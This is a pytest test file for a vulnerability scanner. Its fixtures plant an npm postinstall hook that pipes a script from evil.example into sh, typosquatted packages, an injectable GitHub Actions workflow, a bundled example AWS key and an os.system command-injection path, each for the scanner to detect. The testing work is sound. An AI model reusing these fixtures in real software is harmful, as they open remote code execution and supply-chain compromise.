from datetime import datetime, timedelta, timezone
import json
from pathlib import Path
from unittest.mock import MagicMock, patch
import zipfile

from vuln_scanner.cross_file_taint import scan_cross_file_taint
from vuln_scanner.supply_chain_checks import scan_supply_chain
from vuln_scanner.web_checks import _check_tls, scan_domain_posture, scan_url


def test_cicd_workflow_and_supply_chain_checks(tmp_path: Path):
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "ci.yml").write_text(
        "on: pull_request_target\n"
        "permissions: write-all\n"
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n"
        '      - run: echo "${{ github.event.issue.title }}"\n',
        encoding="utf-8",
    )

    (tmp_path / "package.json").write_text(
        json.dumps({
            "scripts": {"postinstall": "curl https://evil.example/p.sh | sh"},
            "dependencies": {"lodahs": "4.17.21"},
        }),
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps({"lockfileVersion": 2, "dependencies": {"lodahs": {"version": "4.17.21"}}}),
        encoding="utf-8",
    )
    (tmp_path / "requirements.txt").write_text("reqeusts==2.31.0\n", encoding="utf-8")

    # Archive containing a .env file and an AWS key in a packaged script
    whl = tmp_path / "dist.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        zf.writestr(".env", "SECRET=123456\n")
        zf.writestr("pkg/mod.py", 'AWS = "AKIAIOSFODNN7EXAMPLE"\n')

    findings = scan_supply_chain(tmp_path)
    rules = {f["rule_id"] for f in findings}
    assert {"CICD001", "CICD002", "CICD003", "CICD004", "SUP001", "SUP002", "ARC001"} <= rules


def test_cross_file_python_taint_tracking(tmp_path: Path):
    (tmp_path / "helper.py").write_text(
        "import os\n"
        "def run_shell(cmd):\n"
        "    os.system(cmd)\n",
        encoding="utf-8",
    )
    (tmp_path / "routes.py").write_text(
        "from helper import run_shell\n"
        "def endpoint(request):\n"
        "    user_cmd = request.args.get('c')\n"
        "    run_shell(user_cmd)\n",
        encoding="utf-8",
    )

    findings = scan_cross_file_taint(tmp_path)
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "TAINT003"
    assert findings[0]["file"].endswith("routes.py")


def test_tls_expiry_and_dns_spf_dmarc_posture():
    soon = (datetime.now(timezone.utc) + timedelta(days=10)).strftime("%b %d %H:%M:%S %Y GMT")
    mock_ssock = MagicMock()
    mock_ssock.version.return_value = "TLSv1.3"
    mock_ssock.getpeercert.return_value = {"notAfter": soon}
    mock_ssock.__enter__.return_value = mock_ssock

    mock_sock = MagicMock()
    mock_sock.__enter__.return_value = mock_sock

    with patch("vuln_scanner.web_checks.socket.create_connection", return_value=mock_sock), patch(
        "vuln_scanner.web_checks.ssl.create_default_context"
    ) as mock_ctx:
        mock_ctx.return_value.wrap_socket.return_value = mock_ssock
        tls_issues = _check_tls("example.com")

    assert any(r[0] == "WEB014" for r in tls_issues)

    dns_resp = MagicMock()
    dns_resp.status_code = 200
    dns_resp.json.return_value = {"Answer": []}
    with patch("vuln_scanner.web_checks.requests.get", return_value=dns_resp):
        dns_findings = scan_domain_posture("example.com")

    assert {f["rule_id"] for f in dns_findings} == {"DNS001", "DNS002"}


def test_active_web_dast_probes():
    def fake_get(url, **kwargs):
        r = MagicMock()
        r.url = url
        r.headers = {}
        r.status_code = 200
        r.text = "ok"
        if "next=https://evil.example" in url:
            r.status_code = 302
            r.headers = {"Location": "https://evil.example/"}
        elif "id='" in url:
            r.text = "Traceback (most recent call last): ValueError"
        elif "vulnscannercanary987" in url:
            r.text = "<p>vulnscannercanary987<></p>"
        return r

    gql_resp = MagicMock()
    gql_resp.status_code = 200
    gql_resp.text = '{"data":{"__schema":{"types":[]}}}'

    with patch("vuln_scanner.web_checks.requests.get", side_effect=fake_get), patch(
        "vuln_scanner.web_checks.requests.post", return_value=gql_resp
    ):
        findings = scan_url("https://example.com", recon=False, active_web=True)

    rules = {f["rule_id"] for f in findings}
    assert {"WEB015", "WEB016", "WEB017", "WEB018"} <= rules
